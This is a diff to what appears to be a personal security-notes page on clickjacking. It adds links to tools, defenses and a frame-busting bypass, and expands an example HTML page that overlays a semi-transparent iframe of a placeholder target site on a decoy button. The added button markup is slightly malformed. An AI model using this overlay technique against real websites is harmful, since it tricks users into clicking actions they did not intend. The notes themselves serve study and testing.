@@ -7,15 +7,25 @@ aliases:
 ---
 Tricking a user into clicking something different from what the user perceives.
 Attackers have their own website, embed a real website as an iframe into their website, add hidden buttons that overlay buttons in the iframe.
+# Tools
+- [[Clickbandit]]
+# Defenses
+- [[Frame Busting]]
+# Techniques
+- [[Frame Busting IFrame Sandbox Bypass]]
 # Example HTML
 ```
+<!DOCTYPE html>
+<html lang="en">
+
+
 <head>
 	<style>
 		#target_website {
 			position:relative;
-			width:128px;
-			height:128px;
-			opacity:0.00001;
+			width:100%;
+			height:100vh;
+			opacity:0.5;
 			z-index:2;
 			}
 		#decoy_website {
@@ -26,12 +36,22 @@ Attackers have their own website, embed a real website as an iframe into their w
 			}
 	</style>
 </head>
-...
+
 <body>
 	<div id="decoy_website">
-	...decoy web content here...
+		<button 
+		style=""
+>		</button>
 	</div>
 	<iframe id="target_website" src="https://vulnerable-website.com">
 	</iframe>
 </body>
+
+</html>
+```
+Also recommended headers:
+```
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Cache-Control: no-store, max-age=0
 ```
